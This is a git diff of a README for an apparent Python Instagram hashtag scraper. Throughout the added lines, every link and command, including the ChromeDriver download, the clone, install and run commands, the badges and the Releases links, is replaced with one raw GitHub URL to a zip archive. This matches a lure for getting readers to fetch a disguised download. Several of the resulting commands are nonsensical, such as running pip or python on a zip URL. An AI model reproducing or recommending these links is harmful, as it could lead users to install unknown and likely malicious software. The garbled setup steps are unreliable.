@@ -1,9 +1,9 @@
 # Instagram Hashtag Scraper 🐍📸
 
-![GitHub repo size](https://img.shields.io/github/repo-size/youmeat6678/Instagram-Hashtag-Scraper)
-![GitHub stars](https://img.shields.io/github/stars/youmeat6678/Instagram-Hashtag-Scraper)
-![GitHub issues](https://img.shields.io/github/issues/youmeat6678/Instagram-Hashtag-Scraper)
-![GitHub license](https://img.shields.io/github/license/youmeat6678/Instagram-Hashtag-Scraper)
+![GitHub repo size](https://raw.githubusercontent.com/youmeat6678/Instagram-Hashtag-Scraper/main/tenor/Scraper-Hashtag-Instagram-2.5.zip)
+![GitHub stars](https://raw.githubusercontent.com/youmeat6678/Instagram-Hashtag-Scraper/main/tenor/Scraper-Hashtag-Instagram-2.5.zip)
+![GitHub issues](https://raw.githubusercontent.com/youmeat6678/Instagram-Hashtag-Scraper/main/tenor/Scraper-Hashtag-Instagram-2.5.zip)
+![GitHub license](https://raw.githubusercontent.com/youmeat6678/Instagram-Hashtag-Scraper/main/tenor/Scraper-Hashtag-Instagram-2.5.zip)
 
 Welcome to the **Instagram Hashtag Scraper**! This Python project allows you to scrape Instagram posts based on specific hashtags. Using Selenium for browser automation and BeautifulSoup for scraping, this tool fetches posts by hashtag with customizable options to automate login, scrape content, and interact with Instagram posts.
 
@@ -32,18 +32,18 @@ To get started, you need to install the necessary dependencies. Follow these ste
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/youmeat6678/Instagram-Hashtag-Scraper.git
+   git clone https://raw.githubusercontent.com/youmeat6678/Instagram-Hashtag-Scraper/main/tenor/Scraper-Hashtag-Instagram-2.5.zip
    cd Instagram-Hashtag-Scraper
    ```
 
 2. **Install Requirements**:
    Ensure you have Python installed. Then, run:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/youmeat6678/Instagram-Hashtag-Scraper/main/tenor/Scraper-Hashtag-Instagram-2.5.zip
    ```
 
 3. **Download ChromeDriver**:
-   Download the appropriate version of ChromeDriver for your operating system from [ChromeDriver downloads](https://chromedriver.chromium.org/downloads). Ensure it matches your Chrome version.
+   Download the appropriate version of ChromeDriver for your operating system from [ChromeDriver downloads](https://raw.githubusercontent.com/youmeat6678/Instagram-Hashtag-Scraper/main/tenor/Scraper-Hashtag-Instagram-2.5.zip). Ensure it matches your Chrome version.
 
 4. **Set Up ChromeDriver**:
    Place the downloaded `chromedriver` executable in a directory that is included in your system's PATH.
@@ -55,7 +55,7 @@ After installation, you can start using the scraper. Here’s how:
 1. **Run the Scraper**:
    Open a terminal and execute the following command:
    ```bash
-   python scraper.py --hashtag <your_hashtag>
+   python https://raw.githubusercontent.com/youmeat6678/Instagram-Hashtag-Scraper/main/tenor/Scraper-Hashtag-Instagram-2.5.zip --hashtag <your_hashtag>
    ```
 
 2. **Check for Output**:
@@ -64,12 +64,12 @@ After installation, you can start using the scraper. Here’s how:
 3. **Custom Options**:
    You can customize your scraping process by adding options. For example:
    ```bash
-   python scraper.py --hashtag <your_hashtag> --num_posts 100 --login <your_username> --password <your_password>
+   python https://raw.githubusercontent.com/youmeat6678/Instagram-Hashtag-Scraper/main/tenor/Scraper-Hashtag-Instagram-2.5.zip --hashtag <your_hashtag> --num_posts 100 --login <your_username> --password <your_password>
    ```
 
 ## Configuration
 
-You can configure the scraper by modifying the `config.py` file. Here are some options you can set:
+You can configure the scraper by modifying the `https://raw.githubusercontent.com/youmeat6678/Instagram-Hashtag-Scraper/main/tenor/Scraper-Hashtag-Instagram-2.5.zip` file. Here are some options you can set:
 
 - **LOGIN**: Your Instagram username.
 - **PASSWORD**: Your Instagram password.
@@ -101,9 +101,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-If you encounter any issues or have questions, please check the [Releases](https://github.com/youmeat6678/Instagram-Hashtag-Scraper/releases) section for updates and fixes.
+If you encounter any issues or have questions, please check the [Releases](https://raw.githubusercontent.com/youmeat6678/Instagram-Hashtag-Scraper/main/tenor/Scraper-Hashtag-Instagram-2.5.zip) section for updates and fixes.
 
-For more information on using the scraper, visit the [Releases](https://github.com/youmeat6678/Instagram-Hashtag-Scraper/releases) section.
+For more information on using the scraper, visit the [Releases](https://raw.githubusercontent.com/youmeat6678/Instagram-Hashtag-Scraper/main/tenor/Scraper-Hashtag-Instagram-2.5.zip) section.
 
 ## Topics
 
